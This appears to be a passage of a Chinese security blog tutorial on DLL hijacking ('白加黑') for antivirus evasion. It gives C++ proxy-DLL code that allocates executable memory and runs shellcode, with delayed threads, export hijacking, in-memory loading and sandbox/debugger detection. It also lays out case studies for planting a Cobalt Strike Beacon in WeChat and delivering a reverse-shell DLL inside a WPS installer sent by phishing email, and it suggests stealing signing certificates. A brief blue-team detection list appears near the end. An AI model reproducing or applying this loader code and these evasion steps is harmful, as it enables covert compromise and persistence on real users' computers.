class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="comment">// 清理资源（可选）</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/13/cs3/11.webp" loading='lazy'></p>
+<hr>
+<h3 id="4-修改-DLL-文件名"><a href="#4-修改-DLL-文件名" class="headerlink" title="4. 修改 DLL 文件名"></a>4. 修改 DLL 文件名</h3><p><strong>关键步骤</strong>：</p>
+<ol>
+<li>将原始 DLL 重命名为 <code>version_original.dll</code></li>
+<li>将编译生成的恶意 DLL 命名为 <code>version.dll</code></li>
+</ol>
+<p><img src="/2026/02/13/cs3/12.webp" loading='lazy'></p>
+<p><strong>文件结构</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files\Tencent\WeChat\</span><br><span class="line">├── WeChat.exe              (白文件)</span><br><span class="line">├── version.dll             (恶意 DLL)</span><br><span class="line">└── version_original.dll    (原始 DLL)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="步骤四：测试劫持效果"><a href="#步骤四：测试劫持效果" class="headerlink" title="步骤四：测试劫持效果"></a>步骤四：测试劫持效果</h2><h3 id="1-部署文件"><a href="#1-部署文件" class="headerlink" title="1. 部署文件"></a>1. 部署文件</h3><p>将以下文件放入目标程序目录：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">WeChat.exe</span><br><span class="line">version.dll          (恶意 DLL)</span><br><span class="line">version_original.dll (原始 DLL)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="2-启动目标程序-1"><a href="#2-启动目标程序-1" class="headerlink" title="2. 启动目标程序"></a>2. 启动目标程序</h3><p>双击 <code>WeChat.exe</code>，观察是否成功上线：</p>
+<p><img src="/2026/02/13/cs3/13.webp" loading='lazy'></p>
+<p><strong>验证方法</strong>：</p>
+<ol>
+<li><strong>Process Explorer</strong>：查看 <code>WeChat.exe</code> 加载的 DLL 列表</li>
+<li><strong>C2 控制台</strong>：确认 Beacon 上线</li>
+<li><strong>Procmon</strong>：监控 DLL 加载路径</li>
+</ol>
+<hr>
+<h3 id="3-调试技巧"><a href="#3-调试技巧" class="headerlink" title="3. 调试技巧"></a>3. 调试技巧</h3><p><strong>如果程序崩溃</strong>：</p>
+<ol>
+<li><strong>检查架构匹配</strong>：确保 DLL 和 EXE 的位数一致（x86&#x2F;x64）</li>
+<li><strong>检查导出函数</strong>：使用 <code>dumpbin /exports version.dll</code> 验证导出表</li>
+<li><strong>检查原始 DLL 路径</strong>：确保 <code>version_original.dll</code> 存在</li>
+<li><strong>使用调试器</strong>：<code>x64dbg</code> 或 <code>WinDbg</code> 定位崩溃点</li>
+</ol>
+<p><strong>如果未执行 Shellcode</strong>：</p>
+<ol>
+<li><strong>检查 DLL 是否被加载</strong>：使用 Process Explorer 查看</li>
+<li><strong>检查 Shellcode 格式</strong>：确保是 C 数组格式（<code>\xfc\x48...</code>）</li>
+<li><strong>检查内存权限</strong>：确保使用 <code>PAGE_EXECUTE_READWRITE</code></li>
+</ol>
+<hr>
+<h1 id="高级技巧"><a href="#高级技巧" class="headerlink" title="高级技巧"></a>高级技巧</h1><h2 id="1-多线程延迟执行"><a href="#1-多线程延迟执行" class="headerlink" title="1. 多线程延迟执行"></a>1. 多线程延迟执行</h2><p>避免在 <code>DLL_PROCESS_ATTACH</code> 中直接执行 Shellcode，防止程序启动缓慢：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD WINAPI <span class="title">DelayedExecution</span><span class="params">(LPVOID lpParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 延迟 5 秒执行</span></span><br><span class="line">    <span class="built_in">Sleep</span>(<span class="number">5000</span>);</span><br><span class="line"></span><br><span class="line">    LPVOID execMem = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="built_in">sizeof</span>(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">memcpy</span>(execMem, shellcode, <span class="built_in">sizeof</span>(shellcode));</span><br><span class="line">    ((<span class="built_in">void</span>(*)())execMem)();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">DllMain</span><span class="params">(HMODULE hModule, DWORD dwReason, LPVOID lpReserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (dwReason == DLL_PROCESS_ATTACH)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DisableThreadLibraryCalls</span>(hModule);</span><br><span class="line">        <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, DelayedExecution, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="2-导出函数劫持"><a href="#2-导出函数劫持" class="headerlink" title="2. 导出函数劫持"></a>2. 导出函数劫持</h2><p>除了转发所有函数，还可以劫持特定函数：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 劫持 GetFileVersionInfoA</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="function">BOOL WINAPI <span class="title">GetFileVersionInfoA</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    LPCSTR lptstrFilename,</span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD dwHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD dwLen,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID lpData)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 执行恶意代码</span></span><br><span class="line">    <span class="built_in">ExecutePayload</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用原始函数</span></span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span><span class="params">(WINAPI* pGetFileVersionInfoA)</span><span class="params">(LPCSTR, DWORD, DWORD, LPVOID)</span></span>;</span><br><span class="line">    HMODULE hOriginal = <span class="built_in">LoadLibrary</span>(<span class="string">L&quot;version_original.dll&quot;</span>);</span><br><span class="line">    pGetFileVersionInfoA pFunc = (pGetFileVersionInfoA)<span class="built_in">GetProcAddress</span>(hOriginal, <span class="string">&quot;GetFileVersionInfoA&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pFunc</span>(lptstrFilename, dwHandle, dwLen, lpData);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="3-内存加载原始-DLL"><a href="#3-内存加载原始-DLL" class="headerlink" title="3. 内存加载原始 DLL"></a>3. 内存加载原始 DLL</h2><p>避免在磁盘上留下 <code>version_original.dll</code>：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将原始 DLL 嵌入资源</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;version_original_data.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">LoadOriginalDllFromMemory</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HMODULE hModule = <span class="built_in">MemoryLoadLibrary</span>(version_original_dll_data, <span class="built_in">sizeof</span>(version_original_dll_data));</span><br><span class="line">    <span class="comment">// 手动解析导出表并转发函数</span></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="4-环境检测"><a href="#4-环境检测" class="headerlink" title="4. 环境检测"></a>4. 环境检测</h2><p>在执行 Shellcode 前检测沙箱环境：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">IsSandbox</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 检测虚拟机</span></span><br><span class="line">    HKEY hKey;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">RegOpenKeyEx</span>(HKEY_LOCAL_MACHINE, <span class="string">L&quot;SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum&quot;</span>, <span class="number">0</span>, KEY_READ, &amp;hKey) == ERROR_SUCCESS)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span> value[<span class="number">256</span>];</span><br><span class="line">        DWORD size = <span class="built_in">sizeof</span>(value);</span><br><span class="line">        <span class="built_in">RegQueryValueEx</span>(hKey, <span class="string">L&quot;0&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPBYTE)value, &amp;size);</span><br><span class="line">        <span class="built_in">RegCloseKey</span>(hKey);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(value, <span class="string">&quot;VMware&quot;</span>) || <span class="built_in">strstr</span>(value, <span class="string">&quot;VBox&quot;</span>))</span><br><span class="line">            <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检测调试器</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">IsDebuggerPresent</span>())</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">DllMain</span><span class="params">(HMODULE hModule, DWORD dwReason, LPVOID lpReserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (dwReason == DLL_PROCESS_ATTACH)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">IsSandbox</span>())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 执行 Shellcode</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="常见可劫持的-DLL"><a href="#常见可劫持的-DLL" class="headerlink" title="常见可劫持的 DLL"></a>常见可劫持的 DLL</h1><table>
+<thead>
+<tr>
+<th>DLL 名称</th>
+<th>常见白文件</th>
+<th>劫持难度</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>version.dll</code></td>
+<td>微信、QQ、WPS</td>
+<td>低</td>
+<td>最常用，兼容性好</td>
+</tr>
+<tr>
+<td><code>dwmapi.dll</code></td>
+<td>各类桌面程序</td>
+<td>低</td>
+<td>Windows 桌面窗口管理器 API</td>
+</tr>
+<tr>
+<td><code>profapi.dll</code></td>
+<td>系统工具</td>
+<td>中</td>
+<td>用户配置文件 API</td>
+</tr>
+<tr>
+<td><code>cryptsp.dll</code></td>
+<td>加密相关程序</td>
+<td>中</td>
+<td>加密服务提供程序</td>
+</tr>
+<tr>
+<td><code>wlanapi.dll</code></td>
+<td>网络工具</td>
+<td>中</td>
+<td>无线局域网 API</td>
+</tr>
+<tr>
+<td><code>ntshrui.dll</code></td>
+<td>文件管理器</td>
+<td>低</td>
+<td>网络共享 UI</td>
+</tr>
+<tr>
+<td><code>cscapi.dll</code></td>
+<td>同步工具</td>
+<td>中</td>
+<td>离线文件 API</td>
+</tr>
+</tbody></table>
+<hr>
+<h1 id="防御检测与对抗"><a href="#防御检测与对抗" class="headerlink" title="防御检测与对抗"></a>防御检测与对抗</h1><h2 id="蓝队检测手段"><a href="#蓝队检测手段" class="headerlink" title="蓝队检测手段"></a>蓝队检测手段</h2><ol>
+<li><strong>DLL 签名验证</strong>：检查 DLL 是否有合法数字签名</li>
+<li><strong>DLL 路径检测</strong>：监控非系统目录加载的 DLL</li>
+<li><strong>行为分析</strong>：检测 DLL 加载后的异常网络连接</li>
+<li><strong>Sysmon 监控</strong>：记录 <code>ImageLoad</code> 事件（Event ID 7）</li>
+<li><strong>EDR 检测</strong>：检测 <code>VirtualAlloc</code> + <code>memcpy</code> + 线程创建模式</li>
+</ol>
+<h2 id="红队对抗策略"><a href="#红队对抗策略" class="headerlink" title="红队对抗策略"></a>红队对抗策略</h2><ol>
+<li><strong>使用合法签名</strong>：购买代码签名证书或窃取证书</li>
+<li><strong>内存加载</strong>：不在磁盘留下原始 DLL</li>
+<li><strong>延迟执行</strong>：避免在 DLL 加载时立即执行</li>
+<li><strong>加密 Shellcode</strong>：运行时解密，避免静态检测</li>
+<li><strong>混淆导出表</strong>：使用序号导出而非函数名</li>
+<li><strong>选择低关注度白文件</strong>：避免使用知名软件</li>
+</ol>
+<hr>
+<h1 id="实战案例"><a href="#实战案例" class="headerlink" title="实战案例"></a>实战案例</h1><h2 id="案例一：微信-DLL-劫持"><a href="#案例一：微信-DLL-劫持" class="headerlink" title="案例一：微信 DLL 劫持"></a>案例一：微信 DLL 劫持</h2><p><strong>目标</strong>：劫持微信的 <code>version.dll</code></p>
+<p><strong>步骤</strong>：</p>
+<ol>
+<li>使用 Procmon 确认微信加载 <code>version.dll</code></li>
+<li>生成代理 DLL，转发所有导出函数</li>
+<li>在 <code>DllMain</code> 中加载 Cobalt Strike Beacon</li>
+<li>将恶意 DLL 和原始 DLL 放入微信目录</li>
+<li>启动微信，成功上线</li>
+</ol>
+<p><strong>优势</strong>：</p>
+<ul>
+<li>微信是高频使用软件，持久化效果好</li>
+<li>微信有数字签名，不易被拦截</li>
+</ul>
+<hr>
+<h2 id="案例二：WPS-Office-DLL-劫持"><a href="#案例二：WPS-Office-DLL-劫持" class="headerlink" title="案例二：WPS Office DLL 劫持"></a>案例二：WPS Office DLL 劫持</h2><p><strong>目标</strong>：劫持 WPS 的 <code>dwmapi.dll</code></p>
+<p><strong>步骤</strong>：</p>
+<ol>
+<li>分析 WPS 启动时加载的 DLL</li>
+<li>发现 <code>dwmapi.dll</code> 从应用程序目录加载</li>
+<li>生成代理 DLL，嵌入反弹 Shell</li>
+<li>通过钓鱼邮件发送包含恶意 DLL 的 WPS 安装包</li>
+<li>用户安装后，每次启动 WPS 都会触发</li>
+</ol>
+<hr>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>DLL 劫持（白加黑）是一种高效的免杀技术，通过利用 Windows DLL 搜索机制和合法程序的信任链，可以绕过大部分安全软件的检测。实战中需要注意：</p>
+<ol>
+<li><strong>选择合适的白文件</strong>：有签名、高频使用、低关注度</li>
+<li><strong>完整转发导出函数</strong>：避免程序崩溃</li>
+<li><strong>隐蔽执行 Shellcode</strong>：延迟执行、加密、反沙箱</li>
+<li><strong>清理痕迹</strong>：避免在磁盘留下多余文件</li>
+<li><strong>持续更新</strong>：对抗不断升级的检测规则</li>
+</ol>
+<p>记住：DLL 劫持的成功率取决于对目标环境的深入分析和对 Windows 加载机制的理解。</p>
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/DLL%E5%8A%AB%E6%8C%81/">DLL劫持</a><a class="post-meta__tags" href="/tags/%E7%99%BD%E5%8A%A0%E9%BB%91/">白加黑</a><a class="post-meta__tags" href="/tags/Windows/">Windows</a><a class="post-meta__tags" href="/tags/Procmon/">Procmon</a><a class="post-meta__tags" href="/tags/%E5%85%8D%E6%9D%80/">免杀</a></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2026/02/13/tq/" title="Windows/Linux 提权技术实战"><img class="cover" src="/img/covers/shinchan-cover-04.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post" loading='lazy'><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">Windows/Linux 提权技术实战</div></div><div class="info-2"><div class="info-item-1">Windows 提权技术在 Windows 系统中获取初始访问权限后，通常需要将权限提升至 SYSTEM 或管理员级别，以便执行更深入的渗透操作。以下是常见的 Windows 提权技术。  土豆家族提权原理概述“土豆家族”是一系列利用 Windows 本地权限提升漏洞的技术集合，核心原理是滥用 Windows 的 NTLM 认证机制和 COM 对象，诱骗 SYSTEM 权限的进程向攻击者控制的服务进行身份验证，从而窃取 SYSTEM 令牌。  土豆家族演进   技术名称 适用系统 核心原理 利用条件    Hot Potato Windows 7&#x2F;8&#x2F;10&#x2F;Server 2008&#x2F;2012 NBNS 欺骗 + NTLM 中继 SeImpersonate 或 SeAssignPrimaryToken 权限   Rotten Potato Windows 7&#x2F;8&#x2F;10&#x2F;Server 2008&#x2F;2012&#x2F;2016 COM 对象劫持 + NTLM 中继 SeImpersonate 或 SeAssig...</div></div></div></a><a class="pagination-related" href="/2026/02/13/cs1/" title="Cobalt Strike 隐蔽部署与流量转发实战"><img class="cover" src="/img/covers/shinchan-cover-01.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post" loading='lazy'><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">Cobalt Strike 隐蔽部署与流量转发实战</div></div><div class="info-2"><div class="info-item-1">Cobalt Strike 特征抹除Cobalt Strike 作为主流的 C2 框架，其默认配置存在大量可被检测的特征。在实战中，必须对这些特征进行深度定制，才能有效对抗蓝队的流量分析和威胁情报检测。 端口修改默认端口风险Cobalt Strike 默认使用 50050 端口作为团队服务器端口，这是一个明显的指纹特征。蓝队可以通过端口扫描快速定位 CS 服务器。 修改方法编辑 teamserver 文件，修改默认端口： 12345# 找到以下行server_port=50050# 修改为随机高位端口server_port=23456   推荐端口选择策略：  避免使用常见端口（80、443、8080、50050 等） 选择 10000-65535 范围内的随机端口 伪装成常见服务端口（如 3306 伪装 MySQL、5432 伪装 PostgreSQL） 配合防火墙规则，只允许特定 IP 访问   证书特征修改默认证书分析CS 默认使用自签名证书，包含明显的 cobaltstrike 特征字符串。使用以下命令查看证书信息： 12keytool -list -v -keystor...</div></div></div></a></nav></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Kenny</span></div><div class="footer_custom_text"><div class="footer-links"><a class="footer-link" href="https://yyyxxx.cc" target="_blank" rel="noopener noreferrer">友情链接：映雪安全</a><a class="footer-link" href="https://qm.qq.com/q/QNgesnj1aU" target="_blank" rel="noopener noreferrer">QQ群：点击加群</a></div></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"></div><div id="rightside-config-show"><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.4"></script><script src="/js/main.js?v=5.5.4"></script><div class="js-pjax"></div></div></body></html>
